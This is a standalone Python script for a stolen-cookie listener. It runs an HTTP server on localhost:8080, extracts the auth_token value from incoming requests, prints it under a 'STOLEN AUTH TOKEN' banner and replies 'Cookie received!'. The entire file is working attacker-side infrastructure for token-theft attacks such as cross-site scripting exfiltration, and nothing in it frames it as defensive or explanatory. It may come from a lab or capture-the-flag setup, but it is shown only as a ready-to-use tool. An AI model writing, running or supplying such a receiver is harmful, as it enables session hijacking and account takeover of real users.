#!/usr/bin/env python3
import socket
import threading
import time

def handle_client(client_socket, addr):
    try:
        # Receive the request
        request = client_socket.recv(1024).decode('utf-8')
        print(f"\n[+] Request from {addr}:")
        print(request)
        
        # Parse the request to find the auth_token
        if 'auth_token=' in request:
            start = request.find('auth_token=') + 11
            end = request.find(' ', start)
            if end == -1:
                end = request.find('\n', start)
            if end == -1:
                end = len(request)
            
            auth_token = request[start:end].split('&')[0]
            print(f"\n🔥 STOLEN AUTH TOKEN: {auth_token}")
            print("=" * 50)
        
        # Send a simple HTTP response
        response = "HTTP/1.1 200 OK\r\n"
        response += "Content-Type: text/html\r\n"
        response += "Content-Length: 25\r\n"
        response += "\r\n"
        response += "<h1>Cookie received!</h1>"
        
        client_socket.send(response.encode())
        
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('localhost', 8080))
    server.listen(5)
    
    print("🔥 Cookie listener running on http://localhost:8080")
    print("Waiting for stolen cookies...")
    print("=" * 50)
    
    try:
        while True:
            client, addr = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client, addr))
            client_handler.start()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        server.close()

if __name__ == "__main__":
    start_server() 